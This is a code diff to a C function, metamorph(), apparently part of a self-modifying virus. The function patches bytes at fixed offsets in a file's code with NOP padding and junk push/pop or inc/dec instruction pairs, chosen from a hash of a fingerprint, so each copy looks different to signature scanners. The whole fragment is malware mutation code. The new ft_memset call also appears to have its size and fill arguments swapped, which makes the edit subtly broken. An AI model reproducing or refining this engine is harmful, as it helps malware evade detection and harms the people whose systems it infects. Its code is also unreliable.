@@ -96,25 +96,26 @@ void			metamorph(t_info *info, t_fingerprint *fingerprint)
 	tab_offset[3] = (size_t)(info->text_begin + info->text_size + 0x8f);
 	tab_offset[4] = (size_t)(info->text_begin + info->text_size + 0xd1);
 
-	tab_offset[5] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x23);
-	tab_offset[6] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x50);
-	tab_offset[7] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x6d);
-	tab_offset[8] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0xce);
-	tab_offset[9] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x132);
-	tab_offset[10] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x1ca);
-	tab_offset[11] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x24a);
-	tab_offset[12] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x25a);
-	tab_offset[13] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x2ba);
-	tab_offset[14] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x2e8);
-	tab_offset[15] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x377);
-	tab_offset[16] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x3e8);
-	tab_offset[17] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x488);
+	tab_offset[5] = (size_t)(info->file + info->offset_bis + 0x23);
+	tab_offset[6] = (size_t)(info->file + info->offset_bis + 0x50);
+	tab_offset[7] = (size_t)(info->file + info->offset_bis + 0x6d);
+	tab_offset[8] = (size_t)(info->file + info->offset_bis + 0xce);
+	tab_offset[9] = (size_t)(info->file + info->offset_bis + 0x132);
+	tab_offset[10] = (size_t)(info->file + info->offset_bis + 0x1ca);
+	tab_offset[11] = (size_t)(info->file + info->offset_bis + 0x24a);
+	tab_offset[12] = (size_t)(info->file + info->offset_bis + 0x25a);
+	tab_offset[13] = (size_t)(info->file + info->offset_bis + 0x2ba);
+	tab_offset[14] = (size_t)(info->file + info->offset_bis + 0x2e8);
+	tab_offset[15] = (size_t)(info->file + info->offset_bis + 0x377);
+	tab_offset[16] = (size_t)(info->file + info->offset_bis + 0x3e8);
+	tab_offset[17] = (size_t)(info->file + info->offset_bis + 0x488);
 
-	int		i = 0;
+	int		i = 5;
 	unsigned char	ret = 0;
 	unsigned char	i_regs = 0;
 	unsigned char	i_tab = 0;
-	unsigned long	nop = 0x909090909090;
+// 	unsigned long	nop = 0x909090909090;
+// 	char			nop = '\x90';
 
 	while (i < 18)
 	{
@@ -122,7 +123,7 @@ void			metamorph(t_info *info, t_fingerprint *fingerprint)
 		ret = hash_fingerprint(fingerprint->fingerprint, i);
 		i_regs = (ret * 15) / 255;
 		i_tab = (ret * 2) / 255;
-		ft_memcpy((void*)tab_offset[i], &nop, 0x6);
+		ft_memset((void*)tab_offset[i], 0x6, '\x90');
 		if (i_tab == 1)
 		{
 			int		len = 0;
@@ -130,12 +131,12 @@ void			metamorph(t_info *info, t_fingerprint *fingerprint)
 				len = 0x2;
 			else
 				len = 0x4;
-			ft_memcpy((void*)tab_offset[i], &tab_push[i_regs], len);
-			ft_memcpy((void*)tab_offset[i] + 0x4, &tab_pop[i_regs], len);
+			ft_memcpy((void*)tab_offset[i], &tab_push[i_regs], len / 2);
+			ft_memcpy((void*)tab_offset[i] + len / 2, &tab_pop[i_regs], len / 2);
 		} else if (i_tab == 2)
 		{
 			ft_memcpy((void*)tab_offset[i], &tab_inc[i_regs], 0x3);
-			ft_memcpy((void*)tab_offset[i] + 0x4, &tab_dec[i_regs], 0x3);
+			ft_memcpy((void*)tab_offset[i] + 0x3, &tab_dec[i_regs], 0x3);
 		}
 		i++;
 	}
